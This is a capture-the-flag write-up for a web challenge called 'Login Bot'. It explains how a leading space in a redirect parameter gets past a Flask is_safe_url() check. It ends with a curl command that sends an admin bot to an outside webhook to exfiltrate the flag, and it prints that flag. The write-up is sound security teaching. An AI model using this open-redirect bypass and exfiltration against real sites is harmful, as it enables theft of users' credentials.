# Login Bot
Category: Web

## Description
I made a reverse blog where anyone can blog but only I can see it (Opposite of me blogging and everyone seeing). You can post your content with my bot and I'll read it.

Sometimes weird errors happen and the bot gets stuck. I've fixed it now so it should work!

- Junhua

[http://34.124.157.94:5002](http://34.124.157.94:5002)

Attachments: [dist.zip](attachments/dist.zip)

## Write-up
- Upon analyzing the source code, we discovered that the flag is hidden within the password of the `admin` account.
- We identified an unauthenticated `/send_post` endpoint that accepts three arguments: `title`, `content`, `and` url. The first two are required for creating a post, while the third specifies the URL to which the `admin` will be redirected after logging in (default is `/`).
- When the `/send_post` endpoint is accessed, the `admin` is redirected to `http://34.124.157.94:5002/login?next={url}` and makes a POST request to the same URL to perform the login. After successful login, the `admin` is redirected to the specified url before creating our post.
- Initially, we attempted to manipulate the `url` parameter to point to our webhook, hoping that the redirection after login would lead to our webhook and exfiltrate the flag. However, we encountered a challenge with the `is_safe_url()` method, which checks if the `netloc` of the host URL matches the `netloc` of our webhook URL. Since they are different, it was impossible to satisfy this check.
- Here is the logic of the `is_safe_url()` method:
```
def is_safe_url(target):
    """Check if the target URL is safe to redirect to. Only works for within Flask request context."""
    ref_url = urlparse(request.host_url)
    test_url = urlparse(urljoin(request.host_url, target))
    return test_url.scheme in ('http', 'https') and \
           ref_url.netloc == test_url.netloc
```
- Fortunately, we discovered a workaround by prepending a space to our `url` input. When using `urljoin()` to join two different domain URLs, it will just return the latter as the joined URL. However a peculiar behavior occurs when the second parameter is prepended with a space, it is not considered a "valid URL" and as a result the function simply appends the second parameter URL to the first parameter URL, without performing any validation.
- By prepending a space to our second parameter, the `test_url` became `http://34.124.157.94:5002/ https:/webhook.site/774fac7f-86a1-4682-a2c0-883ea13d0a6a`. As a result, both `ref_url` and `test_url` had the same netloc, enabling us to bypass the `is_safe_url()` check.
- Since the `redirect()` method after the check was called on our `url` input directly, without being appended with the host URL just like how it was checked, we were able to redirect to any arbitrary URL.
- Armed with this knowledge, we crafted a command to exfiltrate the flag to our webhook URL:
```
curl -X POST -d "title=a&content=a&url=%20https://webhook.site/774fac7f-86a1-4682-a2c0-883ea13d0a6a" http://34.124.157.94:5002/send_post
```

Flag: `grey{r3d1recTs_r3Dir3cts_4nd_4ll_0f_th3_r3d1r3ct5}`

PS: Unrelated but it is interesting to note the result of `urlparse`'s netloc: [https://github.com/python/cpython/issues/102153#issuecomment-1455710285](https://github.com/python/cpython/issues/102153#issuecomment-1455710285)
